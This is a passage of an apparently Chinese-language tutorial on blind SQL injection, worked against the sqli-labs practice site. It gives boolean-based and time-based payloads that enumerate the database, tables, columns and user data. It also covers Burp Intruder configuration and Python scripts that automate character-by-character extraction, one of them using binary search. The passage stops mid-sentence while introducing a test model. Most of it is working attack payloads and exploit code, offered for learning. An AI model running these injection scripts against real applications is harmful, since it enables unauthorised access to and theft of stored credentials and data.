+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">  	echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;	</span><br><span class="line">  	echo &#x27;You are in...........&#x27;;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">    echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">    ｝</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数ascii() 、substr() 、length()，exists()、concat()等。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233424663.png" alt="image-20230724233424663"><br />1. 判断数据库类型</p>
+<ul>
+<li>MySQL数据库表      information_schema.tables</li>
+<li>access                     msysobjects </li>
+<li>SQLServer               sysobjects</li>
+</ul>
+<p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//判断是否是 access数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233452099.png" alt="image-20230724233452099"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233503521.png" alt="image-20230724233503521"><br />所以当前数据库为mysql数据库<br />2. 判断当前数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"></span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line"></span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line"></span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>判断当前库的表名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line"></span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line"></span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"></span><br><span class="line">2：判断每个表的长度</span><br><span class="line"></span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line"></span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line"></span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">.........</span><br><span class="line"></span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>判断表的字段</li>
+</ol>
+<ul>
+<li>判断字段个数</li>
+<li>判断每个字段的长度</li>
+<li>猜每个字段的字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select username from admin) </span><br><span class="line"></span><br><span class="line">1：判断表中字段的个数</span><br><span class="line"></span><br><span class="line">//判断users表中字段个数是否大于5</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)&gt;5 --+</span><br><span class="line"></span><br><span class="line">2：判断每个字段的长度</span><br><span class="line"></span><br><span class="line">//判断第一个字段的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line">//判断第二个字段的长度   </span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3：判断每个字段名字的ascii值</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第一个字符的ascii</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">//判断第一个字段的第二个字符的ascii</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>爆字段中的数据</li>
+</ol>
+<ul>
+<li>猜字段中数据的长度</li>
+<li>猜字段数据的每个字符ascii码 得字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1: 判断数据的长度</span><br><span class="line"></span><br><span class="line">// 判断id字段的第一个数据的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 0,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line">// 判断id字段的第二个数据的长度</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select id from users limit 1,1))&gt;5 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2：判断数据的ascii值</span><br><span class="line"></span><br><span class="line">// 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">// 判断id字段的第二行数据的第二个字符的ascii值</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...........</span><br></pre></td></tr></table></figure>
+
+<p>一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助<br><a name="cKtbz"></a></p>
+<h4 id="利用burp实现布尔盲注"><a href="#利用burp实现布尔盲注" class="headerlink" title="利用burp实现布尔盲注"></a>利用burp实现布尔盲注</h4><p>抓取访问的数据包发到intruder模块，标记好两个参数，选择集束炸弹模式<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233725789.png" alt="image-20230724233725789"></p>
+<p>第一个变量的负载我们选择数值模式，我们判断过字符长度为8，便选择从1到8，步长为1<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233737217.png" alt="image-20230724233737217"></p>
+<p>第二个负载我们选择burp自带的字母和数字，以及手动添加常见数据库中的可打印字符，如 _  ,  +  -  <br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233759446.png" alt="image-20230724233759446"></p>
+<p>然后开始攻击，通过长度判断，正确位置对应字符是什么，然后排列得到当前数据库为’security’<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233810961.png" alt="image-20230724233810961"></p>
+<p>以此类推，同样的操作用来爆库，爆字段，爆数据<br><a name="D7Wbs"></a></p>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”–延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233825498.png" alt="image-20230724233825498"><br />1. 延时注入<br />?id&#x3D;1’ and sleep(5) –+    <br />如图所示，观察请求的时间线，大概在5秒以上，说明构造的sleep(5) 语句起作用，可以把这个时间线作为sql 注入的判断依据。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233837113.png" alt="image-20230724233837113"><br />2. 获取数据库名字<br />延时注入与布尔盲注类似，构造方法如下，提交参数<br />?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D; 115,sleep(5),0) –+<br />if(expr1,expr2,expr3)       如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。 传送门-》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646302616780261917189%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646302616780261917189&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114327303.pc_v1_rank_blog_v1&utm_term=mysql">mysql基础学习</a><br />代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回。<br />页面显示延时5 秒，说明数据库名字第一个字母的ASCII 值是115，也就是字母s。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233849341.png" alt="image-20230724233849341"><br />3. 数据库名字第二个字母的判断，<br />?id&#x3D;1’ and if(ascii(substr(database(),2,1))&#x3D; 101,sleep(5),0) –+<br />与盲注类似，后面就是猜数，这就是延时注入<br><a name="s6Xm5"></a></p>
+<h4 id="利用burp实现时间盲注"><a href="#利用burp实现时间盲注" class="headerlink" title="利用burp实现时间盲注"></a>利用burp实现时间盲注</h4><p>我们把访问的数据包发到intruder模块，然后标记好两个参数，前几步的方式和布尔盲注都一样，不再赘述，我们直接来看时间盲注结果的筛选，<br />如图所示：<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233900979.png" alt="image-20230724233900979"></p>
+<p>然后我们根据序号排列组合得到当前库名为：security<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233913127.png" alt="image-20230724233913127"></p>
+<p><a name="kVlFz"></a></p>
+<h3 id="盲注exp的编写"><a href="#盲注exp的编写" class="headerlink" title="盲注exp的编写"></a>盲注exp的编写</h3><p><a name="TnIoo"></a></p>
+<h4 id="GET型布尔盲注脚本编写"><a href="#GET型布尔盲注脚本编写" class="headerlink" title="GET型布尔盲注脚本编写"></a>GET型布尔盲注脚本编写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>(<span class="params">sql</span>):</span><br><span class="line">    result, IsTrue = <span class="string">&quot;&quot;</span>, <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue):</span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                res = requests.get(<span class="string">f&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span> -- +&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> res.text):</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    result += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(result)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据长度为<span class="subst">&#123;i - <span class="number">2</span>&#125;</span>,脚本运行结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&quot;select database()&quot;</span></span><br><span class="line">get_info(sql1)</span><br></pre></td></tr></table></figure>
+<p>考虑到有时候可能会出现网络问题，我们要考虑超时重发的问题，我们需要了解以下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">time1 = time.time()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.get(<span class="string">&quot;https://www.google.com&quot;</span>, timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;耗时<span class="subst">&#123;time.time() - time1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>我们执行代码会发现，约9秒过后，便会抛出超时输出信息，但是正常超时大约是二十多秒左右，便是简易的超时重发模块，我们只需对我们刚才布尔盲注的代码稍加改进即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue):</span><br><span class="line">             IsTrue = <span class="literal">False</span></span><br><span class="line">             <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                 <span class="keyword">try</span>:</span><br><span class="line">                     recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; -- +&quot;</span>.<span class="built_in">format</span>(sql,i,j),timeout=<span class="number">3</span>)</span><br><span class="line">                 <span class="keyword">except</span>:</span><br><span class="line">                     exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                 <span class="keyword">if</span> (<span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                     IsTrue = <span class="literal">True</span></span><br><span class="line">                     res += <span class="built_in">chr</span>(j)</span><br><span class="line">                     <span class="built_in">print</span>(res)</span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据长度为<span class="subst">&#123;i - <span class="number">2</span>&#125;</span>,脚本运行结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">sql1 = <span class="string">&#x27;select database()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure>
+
+<p><a name="SPGU5"></a></p>
+<h4 id="GET型布尔盲注脚本-二分"><a href="#GET型布尔盲注脚本-二分" class="headerlink" title="GET型布尔盲注脚本(二分)"></a>GET型布尔盲注脚本(二分)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-8/?id=1&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; -- +&quot;</span>.<span class="built_in">format</span>(sql,i,mid),timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        res = res + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破成功&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure>
+<p><a name="SLHYw"></a></p>
+<h4 id="GET型时间盲注脚本编写"><a href="#GET型时间盲注脚本编写" class="headerlink" title="GET型时间盲注脚本编写"></a>GET型时间盲注脚本编写</h4><p>时间盲注和布尔盲注的脚本大同小异，我们只需要了解三个来获取响应时间的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed)  <span class="comment"># 时:分:秒</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed.total_seconds())  <span class="comment"># 秒数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.elapsed.microseconds)  <span class="comment"># 微秒数</span></span><br></pre></td></tr></table></figure>
+<p>在执行语句前，我们可以设计一个简单的测试模型：</p>
